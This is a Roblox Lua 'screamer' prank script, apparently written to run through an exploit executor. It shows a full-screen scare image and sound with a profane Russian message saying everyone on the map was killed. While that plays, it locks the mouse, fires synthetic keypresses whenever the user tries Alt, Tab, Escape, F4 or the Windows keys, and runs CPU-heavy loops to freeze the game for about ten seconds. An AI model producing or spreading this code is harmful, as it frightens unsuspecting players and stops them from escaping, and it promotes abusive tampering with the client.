local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local CoreGui = game:GetService("CoreGui")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local screamerGui = Instance.new("ScreenGui")
screamerGui.Name = "ScreamerGui"
screamerGui.IgnoreGuiInset = true
screamerGui.ResetOnSpawn = false
screamerGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
screamerGui.Parent = CoreGui

local screamerFrame = Instance.new("Frame")
screamerFrame.Size = UDim2.new(1, 0, 1, 0)
screamerFrame.BackgroundColor3 = Color3.new(0, 0, 0)
screamerFrame.BackgroundTransparency = 0
screamerFrame.Visible = false
screamerFrame.Parent = screamerGui

local screamerImage = Instance.new("ImageLabel")
screamerImage.Size = UDim2.new(1, 0, 1, 0)
screamerImage.BackgroundTransparency = 1
screamerImage.Image = "rbxassetid://1972219027"
screamerImage.ScaleType = Enum.ScaleType.Fit
screamerImage.Visible = false
screamerImage.Parent = screamerFrame

local warningText = Instance.new("TextLabel")
warningText.Size = UDim2.new(1, 0, 1, 0)
warningText.BackgroundTransparency = 1
warningText.Text = "все игроки на карте убиты нахуй"
warningText.TextColor3 = Color3.new(1, 0, 0)
warningText.TextScaled = true
warningText.Font = Enum.Font.SourceSansBold
warningText.TextSize = 50
warningText.Visible = false
warningText.Parent = screamerFrame

local screamerSound = Instance.new("Sound")
screamerSound.SoundId = "rbxassetid://987654321"
screamerSound.Volume = 1
screamerSound.Parent = screamerFrame

local function freezeGame()
    for i = 1, 10000000 do
        local a = math.sqrt(i) * math.sin(i) * math.cos(i)
        local b = math.tan(i) * math.log(i + 1)
        local c = math.atan(i) * math.acos(i/10000000)
        local d = math.asin(i/10000000) * math.exp(i/1000000)
        local e = math.pow(i, 2) * math.rad(i)
        local f = math.deg(i) * math.fmod(i, 100)
    end
end

local function blockAllInput()
    local connections = {}
    
    local function blockInput(input, gameProcessed)
        if input.KeyCode == Enum.KeyCode.LeftAlt or 
           input.KeyCode == Enum.KeyCode.RightAlt or 
           input.KeyCode == Enum.KeyCode.Tab or 
           input.KeyCode == Enum.KeyCode.F11 or 
           input.KeyCode == Enum.KeyCode.Escape or
           input.KeyCode == Enum.KeyCode.L or
           input.KeyCode == Enum.KeyCode.LeftSuper or
           input.KeyCode == Enum.KeyCode.RightSuper or
           input.KeyCode == Enum.KeyCode.LeftWindows or
           input.KeyCode == Enum.KeyCode.RightWindows or
           input.KeyCode == Enum.KeyCode.F4 then
            
            for i = 1, 100 do
                VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
                VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
            end
        end
    end
    
    table.insert(connections, UserInputService.InputBegan:Connect(blockInput))
    
    UserInputService.MouseDeltaSensitivity = 0
    UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
    
    local mouseConnection = UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
        end
    end)
    table.insert(connections, mouseConnection)
    
    local function constantSpam()
        while screamerFrame.Visible do
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.W, false, game)
            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.W, false, game)
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.S, false, game)
            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.S, false, game)
            wait(0.01)
        end
    end
    
    coroutine.wrap(constantSpam)()
    
    return connections
end

local function activateScreamer()
    screamerFrame.Visible = true
    screamerFrame.BackgroundTransparency = 0
    
    warningText.Visible = true
    wait(2)
    warningText.Visible = false
    
    screamerImage.Visible = true
    screamerImage.ImageTransparency = 0
    
    screamerSound:Play()
    
    local inputConnections = blockAllInput()
    
    coroutine.wrap(function()
        while screamerFrame.Visible do
            freezeGame()
            RunService.Heartbeat:Wait()
        end
    end)()
    
    wait(10)
    
    screamerFrame.Visible = false
    screamerImage.Visible = false
    screamerSound:Stop()
    
    for _, connection in pairs(inputConnections) do
        connection:Disconnect()
    end
    
    UserInputService.MouseDeltaSensitivity = 1
    UserInputService.MouseBehavior = Enum.MouseBehavior.Default
end

activateScreamer()
